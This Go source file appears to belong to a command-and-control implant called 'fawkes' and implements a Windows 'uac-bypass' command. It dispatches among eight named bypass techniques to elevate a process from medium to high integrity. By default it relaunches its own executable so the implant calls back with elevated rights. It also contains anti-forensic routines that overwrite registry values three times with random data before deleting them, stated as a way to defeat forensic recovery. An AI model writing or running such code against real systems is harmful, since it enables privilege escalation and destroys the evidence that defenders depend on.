//go:build windows
// +build windows

package commands

import (
	crand "crypto/rand"
	"os"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

// UACBypassCommand implements UAC bypass techniques for medium → high integrity escalation
type UACBypassCommand struct{}

func (c *UACBypassCommand) Name() string {
	return "uac-bypass"
}

func (c *UACBypassCommand) Description() string {
	return "Bypass User Account Control to elevate from medium to high integrity"
}

type uacBypassArgs struct {
	Technique string `json:"technique"` // fodhelper, computerdefaults, sdclt, eventvwr, silentcleanup, cmstp, dismhost, wusa
	Command   string `json:"command"`   // command to run elevated (default: self)
}

func (c *UACBypassCommand) Execute(task structs.Task) structs.CommandResult {
	args, parseErr := unmarshalParams[uacBypassArgs](task)
	if parseErr != nil {
		return *parseErr
	}

	if args.Technique == "" {
		args.Technique = "fodhelper"
	}

	// Check if already elevated — UAC bypass is unnecessary
	if isElevated() {
		return successResult("Already running at high integrity (elevated). UAC bypass not needed.\nUse getsystem to escalate to SYSTEM.")
	}

	// Default: spawn a new copy of ourselves for an elevated callback
	if args.Command == "" {
		exe, err := os.Executable()
		if err != nil {
			return errorf("Error getting executable path: %v", err)
		}
		args.Command = exe
	}

	switch strings.ToLower(args.Technique) {
	case "fodhelper":
		return uacBypassMsSettings(args.Command, resolveSystem32Binary("fodhelper.exe"), "fodhelper")
	case "computerdefaults":
		return uacBypassMsSettings(args.Command, resolveSystem32Binary("computerdefaults.exe"), "computerdefaults")
	case "sdclt":
		return uacBypassSdclt(args.Command)
	case "eventvwr":
		return uacBypassEventvwr(args.Command)
	case "silentcleanup":
		return uacBypassSilentCleanup(args.Command)
	case "cmstp":
		return uacBypassCmstp(args.Command)
	case "dismhost":
		return uacBypassDismhost(args.Command)
	case "wusa":
		return uacBypassWusa(args.Command)
	default:
		return errorf("Unknown technique: %s. Use: fodhelper, computerdefaults, sdclt, eventvwr, silentcleanup, cmstp, dismhost, wusa", args.Technique)
	}
}

// resolveSystem32Binary dynamically resolves a System32 path using
// environment variables instead of hardcoding C:\Windows.
func resolveSystem32Binary(binaryName string) string {
	windir := os.Getenv("WINDIR")
	if windir == "" {
		windir = os.Getenv("SystemRoot")
	}
	if windir == "" {
		windir = `C:\Windows`
	}
	return filepath.Join(windir, "System32", binaryName)
}

// isElevated checks if the current process token is elevated
func isElevated() bool {
	var token windows.Token
	err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &token)
	if err != nil {
		return false
	}
	defer token.Close()
	return token.IsElevated()
}

// shredRegistryValue overwrites a registry string value with random data 3 times
// before deleting it. Defeats forensic recovery from hive slack space.
func shredRegistryValue(key registry.Key, valueName string) {
	for i := 0; i < 3; i++ {
		_ = key.SetStringValue(valueName, randomShredString())
	}
	_ = key.DeleteValue(valueName)
}

// shredRegistryKey opens a registry key, shreds all its string values, then
// deletes the key.
func shredRegistryKey(hive registry.Key, path string) {
	key, err := registry.OpenKey(hive, path, registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		_ = registry.DeleteKey(hive, path)
		return
	}
	names, err := key.ReadValueNames(-1)
	if err == nil {
		for _, name := range names {
			shredRegistryValue(key, name)
		}
	}
	key.Close()
	_ = registry.DeleteKey(hive, path)
}

// randomShredString generates a random 64-character string for registry
// value overwriting. Uses crypto/rand for unpredictable content.
func randomShredString() string {
	const charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, 64)
	_, _ = crand.Read(b)
	for i := range b {
		b[i] = charset[b[i]%byte(len(charset))]
	}
	return string(b)
}
